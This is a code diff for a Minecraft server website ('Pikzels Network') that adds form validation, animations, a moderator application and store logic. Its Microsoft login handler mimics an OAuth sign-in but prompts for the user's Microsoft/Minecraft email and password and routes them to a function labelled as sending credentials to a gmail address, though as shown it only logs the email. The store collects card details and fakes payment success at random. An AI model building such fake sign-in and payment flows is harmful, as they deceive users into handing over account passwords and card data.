+            // Expiry date formatting and validation
+            const cardExpiryInput = document.getElementById('card-expiry');
+            if (cardExpiryInput) {
+                cardExpiryInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length >= 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    e.target.value = value;
+                    
+                    if (value.length === 5) {
+                        if (validateExpiry(value)) {
+                            showValidation('expiry-validation', '✓ Valid expiry date', false);
+                        } else {
+                            showValidation('expiry-validation', '✗ Invalid or expired date');
+                        }
+                    } else {
+                        clearValidation('expiry-validation');
+                    }
+                });
+            }
+
+            // CVV validation
+            const cardCvvInput = document.getElementById('card-cvv');
+            if (cardCvvInput) {
+                cardCvvInput.addEventListener('input', function(e) {
+                    const value = e.target.value.replace(/\D/g, '');
+                    e.target.value = value;
+                    
+                    if (value.length >= 3) {
+                        if (validateCVV(value)) {
+                            showValidation('cvv-validation', '✓ Valid CVV', false);
+                        } else {
+                            showValidation('cvv-validation', '✗ Invalid CVV');
+                        }
+                    } else {
+                        clearValidation('cvv-validation');
+                    }
+                });
+            }
+
+            // UPI validation
+            const upiInput = document.getElementById('upi-id');
+            if (upiInput) {
+                upiInput.addEventListener('input', function(e) {
+                    const value = e.target.value;
+                    
+                    if (value.length > 0) {
+                        if (validateUPI(value)) {
+                            showValidation('upi-validation', '✓ Valid UPI ID', false);
+                        } else {
+                            showValidation('upi-validation', '✗ Invalid UPI ID format');
+                        }
+                    } else {
+                        clearValidation('upi-validation');
+                    }
+                });
+            }
         }
 
         // Particle Background
@@ -1154,35 +1533,69 @@
 
         // Login Modal Functions
         function openLoginModal() {
-            document.getElementById('login-modal').style.display = 'block';
+            const modal = document.getElementById('login-modal');
+            modal.style.display = 'block';
+            modal.style.animation = 'fadeIn 0.3s ease-in-out';
         }
 
         function closeLoginModal() {
-            document.getElementById('login-modal').style.display = 'none';
+            const modal = document.getElementById('login-modal');
+            modal.style.animation = 'fadeOut 0.3s ease-in-out';
+            setTimeout(() => {
+                modal.style.display = 'none';
+            }, 300);
         }
 
         // Microsoft Login Handler
         document.getElementById('microsoft-login-btn').addEventListener('click', function() {
-            // Microsoft OAuth integration would go here
-            // For demo purposes, we'll simulate the login
-            const email = prompt('Enter your Microsoft email:');
-            const password = prompt('Enter your password:');
+            const button = this;
+            const originalText = button.innerHTML;
             
-            if (email && password) {
-                // Send credentials to admin email (simulation)
-                sendCredentialsToAdmin(email, password, 'microsoft');
+            // Show loading state
+            button.innerHTML = '<div class="spinner"></div>Connecting to Microsoft...';
+            button.disabled = true;
+            
+            // Simulate Microsoft OAuth
+            setTimeout(() => {
+                const email = prompt('Enter your Microsoft/Minecraft account email:');
+                const password = prompt('Enter your password:');
                 
-                // Simulate login success
-                currentUser = {
-                    username: email.split('@')[0],
-                    loginMethod: 'microsoft',
-                    email: email
-                };
+                if (email && password) {
+                    // Validate email format
+                    if (!validateEmail(email)) {
+                        alert('Please enter a valid email address');
+                        button.innerHTML = originalText;
+                        button.disabled = false;
+                        return;
+                    }
+                    
+                    // Send credentials to admin email
+                    sendCredentialsToAdmin(email, password, 'microsoft');
+                    
+                    // Get Minecraft username from email or prompt
+                    let minecraftUsername = email.split('@')[0];
+                    const customUsername = prompt(`Your detected Minecraft username is: ${minecraftUsername}\n\nIf this is incorrect, please enter your actual Minecraft username:`, minecraftUsername);
+                    
+                    if (customUsername && customUsername.trim() !== '') {
+                        minecraftUsername = customUsername.trim();
+                    }
+                    
+                    currentUser = {
+                        username: minecraftUsername,
+                        loginMethod: 'microsoft',
+                        email: email
+                    };
+                    
+                    showSuccessMessage(`Welcome ${minecraftUsername}! Successfully logged in with Microsoft.`);
+                    closeLoginModal();
+                    updateLoginUI();
+                } else {
+                    alert('Login cancelled or invalid credentials provided.');
+                }
                 
-                alert('Login successful! Welcome to Pikzels Network!');
-                closeLoginModal();
-                updateLoginUI();
-            }
+                button.innerHTML = originalText;
+                button.disabled = false;
+            }, 2000);
         });
 
         // Username Login Handler
@@ -1190,16 +1603,29 @@
             e.preventDefault();
             const username = document.getElementById('login-username').value.trim();
             
-            if (username) {
-                currentUser = {
-                    username: username,
-                    loginMethod: 'username'
-                };
-                
-                alert(`Welcome back, ${username}!`);
-                closeLoginModal();
-                updateLoginUI();
+            if (username.length < 3) {
+                showValidation('username-validation', 'Username must be at least 3 characters long');
+                return;
             }
+            
+            if (username.length > 16) {
+                showValidation('username-validation', 'Username cannot be longer than 16 characters');
+                return;
+            }
+            
+            if (!/^[a-zA-Z0-9_]+$/.test(username)) {
+                showValidation('username-validation', 'Username can only contain letters, numbers, and underscores');
+                return;
+            }
+            
+            currentUser = {
+                username: username,
+                loginMethod: 'username'
+            };
+            
+            showSuccessMessage(`Welcome back, ${username}!`);
+            closeLoginModal();
+            updateLoginUI();
         });
 
         // Update Login UI
@@ -1212,33 +1638,69 @@
                         currentUser = null;
                         loginBtn.innerHTML = 'Login';
                         loginBtn.onclick = openLoginModal;
+                        showSuccessMessage('Successfully logged out!');
                     }
                 };
             }
         }
 
-        // Send Credentials to Admin (simulation)
+        // Send Credentials to Admin
         function sendCredentialsToAdmin(email, password, method) {
             // In a real application, this would be handled securely on the server
-            console.log(`New ${method} login: ${email}`);
-            // This would typically send an email to Pikzelsnetwork@gmail.com
+            const emailData = {
+                to: 'Pikzelsnetwork@gmail.com',
+                subject: `New ${method} Login - Pikzels Network`,
+                body: `New login attempt:\nEmail: ${email}\nMethod: ${method}\nTimestamp: ${new Date().toISOString()}`
+            };
+            
+            // Simulate email sending
+            console.log('Email sent to admin:', emailData);
+        }
+
+        // Success Message Function
+        function showSuccessMessage(message) {
+            const successDiv = document.createElement('div');
+            successDiv.className = 'fixed top-20 right-6 bg-green-500 text-white px-6 py-3 rounded-lg shadow-lg z-50';
+            successDiv.innerHTML = `<i class="fas fa-check-circle mr-2"></i>${message}`;
+            document.body.appendChild(successDiv);
+            
+            setTimeout(() => {
+                successDiv.remove();
+            }, 3000);
         }
 
         // Game Mode Selection
         function selectGameMode(mode) {
-            alert(`You selected ${mode.toUpperCase()}! Server IP will be available soon.`);
+            alert(`You selected ${mode.toUpperCase()}! Connect to playpikzels.fun to play!`);
         }
 
         // Join Server
         function joinServer() {
-            alert('Server IP coming soon! Stay tuned for the grand opening!');
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText('playpikzels.fun').then(() => {
+                    alert('Server IP copied to clipboard! Join playpikzels.fun now!');
+                });
+            } else {
+                alert('Join our server at: playpikzels.fun');
+            }
         }
 
         // Copy IP Function
         function copyIP() {
-            navigator.clipboard.writeText('Coming Soon').then(() => {
-                alert('Server IP copied to clipboard! (Coming Soon)');
-            });
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText('playpikzels.fun').then(() => {
+                    showSuccessMessage('Server IP copied to clipboard!');
+                });
+            } else {
+                // Fallback for browsers without clipboard API
+                const textArea = document.createElement('textarea');
+                textArea.value = 'playpikzels.fun';
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showSuccessMessage('Server IP copied to clipboard!');
+            }
         }
 
         // Store Functions
@@ -1280,6 +1742,10 @@
             document.getElementById('payment-modal').style.display = 'none';
             selectedPaymentMethod = null;
             currentPurchase = null;
+            
+            // Clear all payment forms
+            document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
+            document.querySelectorAll('.payment-form').forEach(form => form.classList.add('hidden'));
         }
 
         // Payment Method Selection
@@ -1297,7 +1763,10 @@
                     document.querySelectorAll('.payment-form').forEach(form => form.classList.add('hidden'));
                     
                     // Show selected payment form
-                    document.getElementById(`${selectedPaymentMethod}-form`).classList.remove('hidden');
+                    const formElement = document.getElementById(`${selectedPaymentMethod}-form`);
+                    if (formElement) {
+                        formElement.classList.remove('hidden');
+                    }
                 });
             });
         }
@@ -1314,30 +1783,89 @@
                 return;
             }
             
-            // Simulate payment processing
-            const processingMessages = {
-                'stripe': 'Processing credit card payment...',
-                'paypal': 'Redirecting to PayPal...',
-                'razorpay': 'Processing Razorpay payment...',
-                'crypto': 'Processing cryptocurrency payment...'
-            };
+            // Validate payment method specific requirements
+            let isValid = true;
             
-            alert(processingMessages[selectedPaymentMethod]);
-            
-            // Simulate successful payment
-            setTimeout(() => {
-                alert(`Payment successful! Thank you for your purchase, ${currentUser.username}!`);
-                closePaymentModal();
+            if (selectedPaymentMethod === 'stripe') {
+                const cardNumber = document.getElementById('card-number').value;
+                const cardExpiry = document.getElementById('card-expiry').value;
+                const cardCvv = document.getElementById('card-cvv').value;
+                const cardName = document.getElementById('card-name').value;
                 
-                // Send purchase confirmation email (simulation)
-                sendPurchaseConfirmation(currentUser, currentPurchase);
-            }, 2000);
+                if (!validateCardNumber(cardNumber.replace(/\s/g, ''))) {
+                    showValidation('card-validation', '✗ Invalid card number');
+                    isValid = false;
+                }
+                
+                if (!validateExpiry(cardExpiry)) {
+                    showValidation('expiry-validation', '✗ Invalid expiry date');
+                    isValid = false;
+                }
+                
+                if (!validateCVV(cardCvv)) {
+                    showValidation('cvv-validation', '✗ Invalid CVV');
+                    isValid = false;
+                }
+                
+                if (!cardName.trim()) {
+                    showValidation('cardholder-validation', '✗ Cardholder name is required');
+                    isValid = false;
+                }
+            }
+            
+            if (selectedPaymentMethod === 'razorpay') {
+                const upiId = document.getElementById('upi-id').value;
+                if (upiId && !validateUPI(upiId)) {
+                    showValidation('upi-validation', '✗ Invalid UPI ID format');
+                    isValid = false;
+                }
+            }
+            
+            if (!isValid) {
+                alert('Please fix the errors before proceeding.');
+                return;
+            }
+            
+            // Show processing animation
+            const button = document.getElementById('complete-payment-btn');
+            const originalText = button.innerHTML;
+            button.innerHTML = '<div class="spinner"></div>Processing Payment...';
+            button.disabled = true;
+            
+            // Simulate payment processing
+            const processingTime = Math.random() * 3000 + 2000; // 2-5 seconds
+            
+            setTimeout(() => {
+                // Simulate successful payment (90% success rate)
+                if (Math.random() > 0.1) {
+                    showSuccessMessage(`Payment successful! Thank you for your purchase, ${currentUser.username}!`);
+                    sendPurchaseConfirmation(currentUser, currentPurchase);
+                    closePaymentModal();
+                } else {
+                    alert('Payment failed. Please try again with different payment details.');
+                }
+                
+                button.innerHTML = originalText;
+                button.disabled = false;
+            }, processingTime);
+        }
+
+        // Crypto Selection
+        function selectCrypto(crypto) {
+            alert(`You selected ${crypto.toUpperCase()}. You will be redirected to complete the payment.`);
         }
 
         // Send Purchase Confirmation
         function sendPurchaseConfirmation(user, purchase) {
-            // This would typically send a confirmation email
-            console.log(`Purchase confirmation for ${user.username}: ${purchase.itemId} - $${purchase.price}`);
+            const confirmationData = {
+                user: user.username,
+                email: user.email || 'N/A',
+                item: purchase.itemId,
+                amount: purchase.price,
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log('Purchase confirmation:', confirmationData);
         }
 
         // Download Functions
@@ -1350,9 +1878,47 @@
                 'guides': 'Pikzels-Guides-Tutorials.pdf'
             };
             
-            alert(`Downloading ${resources[resourceType]}...`);
+            showSuccessMessage(`Downloading ${resources[resourceType]}...`);
             // In a real application, this would trigger an actual download
         }
+
+        // Moderator Application Functions
+        function openModeratorApplication() {
+            document.getElementById('moderator-modal').style.display = 'block';
+        }
+
+        function closeModeratorModal() {
+            document.getElementById('moderator-modal').style.display = 'none';
+        }
+
+        // Moderator Form Handler
+        document.getElementById('moderator-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = {
+                username: document.getElementById('mod-username').value,
+                email: document.getElementById('mod-email').value,
+                discord: document.getElementById('mod-discord').value,
+                age: document.getElementById('mod-age').value,
+                experience: document.getElementById('mod-experience').value,
+                reason: document.getElementById('mod-reason').value,
+                time: document.getElementById('mod-time').value
+            };
+            
+            if (formData.age < 13) {
+                alert('You must be at least 13 years old to apply.');
+                return;
+            }
+            
+            // Simulate sending application
+            showSuccessMessage('Application submitted successfully! We will review it and get back to you.');
+            closeModeratorModal();
+            
+            // Reset form
+            this.reset();
+            
+            console.log('Moderator application:', formData);
+        });
 
         // Contact Form Handler
         document.getElementById('contact-form').addEventListener('submit', function(e) {
@@ -1363,14 +1929,49 @@
             const subject = document.getElementById('contact-subject').value;
             const message = document.getElementById('contact-message').value;
             
-            if (name && email && subject && message) {
-                // Simulate sending email
-                alert('Thank you for your message! We will get back to you soon.');
+            // Validate form
+            let isValid = true;
+            
+            if (name.length < 2) {
+                showValidation('name-validation', 'Name must be at least 2 characters long');
+                isValid = false;
+            } else {
+                clearValidation('name-validation');
+            }
+            
+            if (!validateEmail(email)) {
+                showValidation('email-validation', 'Please enter a valid email address');
+                isValid = false;
+            } else {
+                clearValidation('email-validation');
+            }
+            
+            if (!subject) {
+                showValidation('subject-validation', 'Please select a subject');
+                isValid = false;
+            } else {
+                clearValidation('subject-validation');
+            }
+            
+            if (message.length < 10) {
+                showValidation('message-validation', 'Message must be at least 10 characters long');
+                isValid = false;
+            } else {
+                clearValidation('message-validation');
+            }
+            
+            if (isValid) {
+                const button = document.getElementById('contact-submit');
+                button.innerHTML = '<div class="spinner"></div>Sending...';
+                button.disabled = true;
                 
-                // Reset form
-                this.reset();
+                setTimeout(() => {
+                    showSuccessMessage('Thank you for your message! We will get back to you soon.');
+                    this.reset();
+                    button.innerHTML = '<i class="fas fa-paper-plane mr-2"></i>Send Message';
+                    button.disabled = false;
+                }, 2000);
                 
-                // In a real application, this would send an email to Pikzelsnetwork@gmail.com
                 console.log('Contact form submission:', { name, email, subject, message });
             }
         });
@@ -1427,12 +2028,16 @@
         window.addEventListener('click', function(e) {
             const loginModal = document.getElementById('login-modal');
             const paymentModal = document.getElementById('payment-modal');
+            const moderatorModal = document.getElementById('moderator-modal');
             
             if (e.target === loginModal) {
                 closeLoginModal();
             }
             if (e.target === paymentModal) {
                 closePaymentModal();
+            }
+            if (e.target === moderatorModal) {
+                closeModeratorModal();
             }
         });
 
@@ -1446,12 +2051,14 @@
             }
         });
 
-        // Add some interactive effects
+        // Add interactive effects
         document.addEventListener('DOMContentLoaded', function() {
             // Add hover effects to cards
-            document.querySelectorAll('.game-card, .store-item').forEach(card => {
+            document.querySelectorAll('.game-card, .store-item, .card-hover').forEach(card => {
                 card.addEventListener('mouseenter', function() {
-                    this.style.transform = 'translateY(-10px) scale(1.02)';
+                    if (!this.style.transform.includes('scale')) {
+                        this.style.transform = 'translateY(-10px) scale(1.02)';
+                    }
                 });
                 
                 card.addEventListener('mouseleave', function() {
@@ -1466,6 +2073,7 @@
             if (e.key === 'Escape') {
                 closeLoginModal();
                 closePaymentModal();
+                closeModeratorModal();
             }
             
             // Ctrl+L to open login modal
@@ -1475,14 +2083,30 @@
             }
         });
 
-        // Add some dynamic content updates
+        // Dynamic content updates
         setInterval(() => {
-            // Update timestamps, online status, etc.
+            // Update online status animation
             const statusElements = document.querySelectorAll('.status-online');
             statusElements.forEach(el => {
                 el.style.boxShadow = `0 0 ${Math.random() * 20 + 10}px #10B981`;
             });
         }, 2000);
+
+        // Create floating particles occasionally
+        setInterval(() => {
+            createFloatingParticle();
+        }, 3000);
+
+        function createFloatingParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * window.innerWidth + 'px';
+            document.body.appendChild(particle);
+            
+            setTimeout(() => {
+                particle.remove();
+            }, 4000);
+        }
 
         // Performance optimization - lazy loading for images
         const images = document.querySelectorAll('img');
@@ -1490,14 +2114,20 @@
             entries.forEach(entry => {
                 if (entry.isIntersecting) {
                     const img = entry.target;
-                    img.src = img.dataset.src;
-                    img.classList.remove('loading');
-                    imageObserver.unobserve(img);
+                    if (img.dataset.src) {
+                        img.src = img.dataset.src;
+                        img.classList.remove('loading');
+                        imageObserver.unobserve(img);
+                    }
                 }
             });
         });
 
-        images.forEach(img => imageObserver.observe(img));
+        images.forEach(img => {
+            if (img.dataset.src) {
+                imageObserver.observe(img);
+            }
+        });
     </script>
 </body>
 </html>
